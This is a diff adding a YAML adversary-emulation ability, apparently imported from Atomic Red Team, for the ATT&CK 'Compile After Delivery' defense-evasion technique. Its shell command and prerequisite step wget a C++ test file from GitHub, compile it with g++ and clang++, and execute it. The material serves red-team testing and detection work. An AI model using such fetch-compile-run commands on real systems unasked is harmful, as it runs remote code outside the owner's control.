@@ -1,0 +1,43 @@
+- id: da97bb11-d6d0-4fc1-b445-e443d1346efe
+  name: CC compile
+  description: Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1027.004
+    name: 'Obfuscated Files or Information: Compile After Delivery'
+  platforms:
+    linux:
+      sh:
+        command: 'if [ -e  T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+          -O T1027-004-test.cc; fi; g++ T1027-004-test.cc && ./a.out; clang++ T1027-004-test.cc
+          && ./a.out'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1027.004
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      input_file:
+        description: source file
+        type: path
+        default: PathToAtomicsFolder/T1027.004/src/T1027-004-test.cc
+    dependencies:
+    - description: 'the source file must exist on disk at specified location (#{input_file})
+
+        '
+      prereq_command: 'if [ -e  #{input_file} ]; then exit 0; else exit 1; fi
+
+        '
+      get_prereq_command: 'wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc
+        -O #{input_file}
+
+        '
+    technique_created: '2020-03-16T15:30:57.711Z'
+    atomic_guid: da97bb11-d6d0-4fc1-b445-e443d1346efe
+    import_timestamp: '2025-06-24T11:15:55.747663Z'
